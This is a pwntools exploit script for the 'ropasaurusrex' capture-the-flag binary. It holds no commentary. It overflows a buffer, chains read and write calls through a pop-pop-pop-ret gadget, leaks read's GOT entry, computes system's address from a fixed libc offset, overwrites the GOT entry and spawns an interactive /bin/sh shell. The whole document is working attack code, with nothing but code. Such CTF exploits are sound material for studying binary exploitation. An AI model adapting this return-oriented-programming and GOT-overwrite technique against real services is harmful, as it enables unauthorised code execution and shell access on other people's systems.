from pwn import *

p = process('./ropasaurusrex')
e = ELF('./ropasaurusrex')
pppr = 0x080484b6
#context(arch='i386',os='linux',endian='little',log_level='debug')
payload="A"*140
offset = 0x9ad60 # read- system
payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.bss())
payload+=p32(len("/bin/sh\x00"))

payload+=p32(e.plt['write'])
payload+=p32(pppr)
payload+=p32(1)
payload+=p32(e.got['read'])
payload+=p32(4)

payload+=p32(e.plt['read'])
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(e.got['read'])
payload+=p32(4)

payload+=p32(e.plt['read'])
payload+="AAAA"
payload+=p32(e.bss())

p.send(payload)
p.send("/bin/sh\x00")


read = u32(p.recv(4))
print hex(read)

system = read - offset

print hex(system)

p.send(p32(system))

p.interactive()
